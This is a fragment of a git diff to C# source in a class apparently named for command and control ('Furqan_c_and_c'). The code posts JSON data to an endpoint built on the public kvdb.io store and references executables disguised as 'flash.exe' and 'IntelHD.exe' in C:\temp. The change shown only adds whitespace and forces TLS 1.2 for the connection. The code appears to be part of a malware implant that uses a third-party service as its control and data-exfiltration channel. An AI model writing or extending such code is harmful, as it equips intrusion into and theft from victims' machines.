@@ -82,12 +82,13 @@ public class Furqan_c_and_c
 }
 class Furqan_D
 {
+	
 	public string PostTheData(string endpoint, string json)
 	{
     		
 			Output.WriteLine("(2) End point is : " +endpoint);
     		string jsonResponse = string.Empty;
- 
+			
     		using (var client = new WebClient())
     		{
        		 try
@@ -174,6 +175,8 @@ class Furqan_D
 		string res_key=res;
 		string updated_ep="https://kvdb.io/"+res+"/master_files";
 		Furqan_D obj=new Furqan_D();
+		ServicePointManager.Expect100Continue = true;
+		ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
 		try
 		{
 			string a="C:\\temp\\flash.exe,C:\\temp\\IntelHD.exe,VB";
